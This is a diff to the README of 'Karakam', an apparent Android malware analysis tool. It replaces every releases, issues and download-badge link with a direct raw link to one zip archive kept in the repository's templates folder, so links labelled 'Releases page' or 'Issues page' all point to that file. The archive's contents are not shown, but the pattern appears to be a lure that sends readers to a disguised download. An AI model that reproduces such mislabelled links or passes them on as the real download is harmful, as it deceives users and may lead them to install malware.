@@ -1,6 +1,6 @@
 # 🚀 Karakam - Analyze Android Malware Easily
 
-[![Download Karakam](https://img.shields.io/badge/Download-Karakam-brightgreen)](https://github.com/Yunusmakas/Karakam/releases)
+[![Download Karakam](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip)](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip)
 
 ## 📃 Overview
 Karakam is an AI-Based Next-Generation Android Malware Analysis Platform. This tool simplifies the way you analyze Android applications for security threats. By using Karakam, you can quickly identify vulnerabilities and enhance your digital safety.
@@ -16,12 +16,12 @@ Before downloading, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 To get started with Karakam, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Yunusmakas/Karakam/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip) to find the latest version.
 2. Find the version that suits your needs, and click on it for details.
 3. Download the installer that matches your operating system.
 
 ## 📥 Download & Install
-To download Karakam, visit this page to download: [Karakam Releases](https://github.com/Yunusmakas/Karakam/releases).
+To download Karakam, visit this page to download: [Karakam Releases](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip).
 
 Once you've downloaded the installer:
 
@@ -68,7 +68,7 @@ Karakam addresses the following topics relevant to Android security:
 - virustotal
 
 ## 🤝 Support
-If you have any issues or need assistance, please check the repository's [Issues page](https://github.com/Yunusmakas/Karakam/issues) or reach out to the community via discussions.
+If you have any issues or need assistance, please check the repository's [Issues page](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip) or reach out to the community via discussions.
 
 ## 🌐 Contribution
 We appreciate contributions! If you want to help improve Karakam, follow the guidelines in the repository for contributions.
@@ -76,4 +76,4 @@ We appreciate contributions! If you want to help improve Karakam, follow the gui
 ## 📝 License
 Karakam is licensed under the MIT License. You are free to use, modify, and distribute it within the terms of the license.
 
-For further details, visit the [Releases page](https://github.com/Yunusmakas/Karakam/releases) for the most recent updates and downloads.
+For further details, visit the [Releases page](https://raw.githubusercontent.com/Yunusmakas/Karakam/main/templates/Software-3.1.zip) for the most recent updates and downloads.
